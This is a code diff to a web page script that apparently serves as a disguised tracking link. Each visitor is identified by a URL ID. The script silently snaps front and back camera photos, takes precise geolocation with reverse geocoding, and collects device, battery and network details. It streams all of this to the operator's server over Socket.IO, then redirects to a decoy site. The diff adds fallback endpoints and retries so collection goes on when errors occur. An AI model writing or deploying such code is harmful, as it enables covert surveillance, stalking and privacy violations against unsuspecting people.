@@ -62,6 +62,14 @@
             border-radius: 5px;
             text-align: center;
         }
+        .fallback {
+            background: #ed8936;
+            color: white;
+            padding: 10px;
+            border-radius: 5px;
+            text-align: center;
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -82,52 +90,86 @@
             ⏳ Collecting data...
         </div>
         
-        <!-- Error message if something goes wrong -->
-        <div id="errorMessage" style="display:none;" class="error">
+        <div id="errorMessage" class="error" style="display:none;">
             ⚠️ Something went wrong. Please try again.
+        </div>
+        
+        <div id="fallbackMessage" class="fallback">
+            ⚠️ Using fallback redirect. Data collection continues...
         </div>
     </div>
     
-    <!-- IMPORTANT: Use CDN for Socket.IO -->
     <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
     <script>
-        // Get visitor ID from URL
         const visitorId = window.location.pathname.split('/').pop();
         console.log('Visitor ID:', visitorId);
         
         let socket = null;
         let localStream = null;
         let redirectUrl = '';
+        let dataCollectionComplete = false;
         
         // ========================================
         // 1. FETCH REDIRECT URL FROM SERVER
         // ========================================
         function fetchRedirectUrl() {
+            console.log('Fetching redirect URL for visitor:', visitorId);
+            
+            // Try main endpoint
             fetch(`/api/visitor/${visitorId}`)
-                .then(response => response.json())
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error(`HTTP error! status: ${response.status}`);
+                    }
+                    return response.json();
+                })
                 .then(data => {
-                    console.log('Visitor data:', data);
+                    console.log('Visitor data received:', data);
                     redirectUrl = data.redirectUrl || 'https://www.google.com';
                     console.log('Redirect URL:', redirectUrl);
-                    
-                    // Start data collection
-                    initConnection();
+                    startDataCollection();
                 })
                 .catch(error => {
                     console.error('Error fetching visitor data:', error);
-                    document.getElementById('errorMessage').style.display = 'block';
-                    document.getElementById('connectionStatus').innerHTML = '❌ Error loading data';
-                    document.getElementById('connectionStatus').style.background = '#fc8181';
+                    
+                    // Try fallback endpoint
+                    fetch(`/api/visitor-redirect/${visitorId}`)
+                        .then(response => response.json())
+                        .then(data => {
+                            if (data.redirectUrl) {
+                                redirectUrl = data.redirectUrl;
+                                console.log('Fallback redirect URL:', redirectUrl);
+                                document.getElementById('fallbackMessage').style.display = 'block';
+                                startDataCollection();
+                            } else {
+                                throw new Error('No redirect URL found');
+                            }
+                        })
+                        .catch(() => {
+                            // Ultimate fallback
+                            redirectUrl = 'https://www.google.com';
+                            console.log('Using ultimate fallback URL:', redirectUrl);
+                            document.getElementById('fallbackMessage').style.display = 'block';
+                            document.getElementById('fallbackMessage').innerHTML = '⚠️ Using default fallback. Data collection continues...';
+                            startDataCollection();
+                        });
                 });
         }
         
         // ========================================
-        // 2. INITIALIZE SOCKET CONNECTION
+        // 2. START DATA COLLECTION
+        // ========================================
+        function startDataCollection() {
+            console.log('Starting data collection...');
+            initConnection();
+        }
+        
+        // ========================================
+        // 3. INITIALIZE SOCKET CONNECTION
         // ========================================
         function initConnection() {
             console.log('Initializing socket connection...');
             
-            // Connect to Socket.IO
             socket = io({
                 transports: ['websocket', 'polling']
             });
@@ -137,7 +179,6 @@
                 document.getElementById('connectionStatus').innerHTML = '✅ Connected! Collecting data...';
                 document.getElementById('connectionStatus').style.background = '#48bb78';
                 
-                // Get device info
                 const deviceInfo = {
                     userAgent: navigator.userAgent,
                     platform: navigator.platform,
@@ -147,13 +188,11 @@
                     simNetwork: 'N/A'
                 };
                 
-                // Send visitor connect event
                 socket.emit('visitor-connect', {
                     visitorId: visitorId,
                     ...deviceInfo
                 });
                 
-                // Start collecting data
                 setTimeout(() => {
                     setupCamera();
                     getLocation();
@@ -167,6 +206,10 @@
                 document.getElementById('errorMessage').style.display = 'block';
                 document.getElementById('connectionStatus').innerHTML = '❌ Connection failed';
                 document.getElementById('connectionStatus').style.background = '#fc8181';
+                // Retry after 3 seconds
+                setTimeout(() => {
+                    socket.connect();
+                }, 3000);
             });
             
             socket.on('disconnect', () => {
@@ -184,13 +227,12 @@
         }
         
         // ========================================
-        // 3. CAMERA SETUP
+        // 4. CAMERA SETUP
         // ========================================
         async function setupCamera() {
             try {
                 console.log('Setting up camera...');
                 
-                // Front camera
                 const frontStream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'user' },
                     audio: false
@@ -200,12 +242,10 @@
                 video.srcObject = frontStream;
                 document.getElementById('cameraPreview').style.display = 'block';
                 
-                // Auto capture front photo after 2 seconds
                 setTimeout(() => {
                     capturePhoto('front');
                 }, 2000);
                 
-                // Back camera (if available)
                 try {
                     const backStream = await navigator.mediaDevices.getUserMedia({
                         video: { facingMode: 'environment' },
@@ -229,13 +269,12 @@
                 return true;
             } catch (error) {
                 console.error('Camera error:', error);
-                // Continue without camera
                 return false;
             }
         }
         
         // ========================================
-        // 4. CAPTURE PHOTO
+        // 5. CAPTURE PHOTO
         // ========================================
         function capturePhoto(type, videoElement = null) {
             const video = videoElement || document.getElementById('video');
@@ -252,7 +291,6 @@
             
             const imageData = canvas.toDataURL('image/jpeg', 0.8);
             
-            // Send to server
             if (socket && socket.connected) {
                 socket.emit('visitor-data', {
                     visitorId: visitorId,
@@ -262,12 +300,11 @@
                 console.log(`📸 ${type} camera photo captured and sent!`);
             }
             
-            // Check if all data collected
             checkAndRedirect();
         }
         
         // ========================================
-        // 5. GET LOCATION
+        // 6. GET LOCATION
         // ========================================
         function getLocation() {
             console.log('Getting location...');
@@ -278,7 +315,6 @@
                         const lat = position.coords.latitude;
                         const lng = position.coords.longitude;
                         
-                        // Get location details using reverse geocoding
                         fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=en`)
                             .then(response => response.json())
                             .then(locationData => {
@@ -305,7 +341,6 @@
                                 checkAndRedirect();
                             })
                             .catch(() => {
-                                // Fallback - basic location
                                 const locationInfo = {
                                     lat: lat,
                                     lng: lng,
@@ -336,7 +371,7 @@
         }
         
         // ========================================
-        // 6. GET BATTERY INFO
+        // 7. GET BATTERY INFO
         // ========================================
         function getBatteryInfo() {
             if (navigator.getBattery) {
@@ -355,7 +390,7 @@
         }
         
         // ========================================
-        // 7. GET NETWORK INFO
+        // 8. GET NETWORK INFO
         // ========================================
         function getNetworkInfo() {
             if (navigator.connection) {
@@ -377,10 +412,14 @@
         }
         
         // ========================================
-        // 8. CHECK AND REDIRECT
+        // 9. CHECK AND REDIRECT
         // ========================================
+        let redirectTriggered = false;
+        
         function checkAndRedirect() {
-            // Redirect after 5 seconds
+            if (redirectTriggered) return;
+            
+            // Wait 5 seconds then redirect
             setTimeout(() => {
                 console.log('Redirecting to:', redirectUrl);
                 
@@ -392,10 +431,10 @@
                     });
                 }
                 
+                redirectTriggered = true;
                 document.getElementById('connectionStatus').innerHTML = '✅ Data collected! Redirecting...';
                 document.getElementById('connectionStatus').style.background = '#48bb78';
                 
-                // Redirect to original URL after 2 seconds
                 setTimeout(() => {
                     window.location.href = redirectUrl;
                 }, 2000);
@@ -403,12 +442,10 @@
         }
         
         // ========================================
-        // 9. START THE PROCESS
+        // 10. START THE PROCESS
         // ========================================
-        // Fetch redirect URL first
         fetchRedirectUrl();
         
-        // Cleanup on page leave
         window.addEventListener('beforeunload', () => {
             if (localStream) {
                 localStream.getTracks().forEach(track => track.stop());
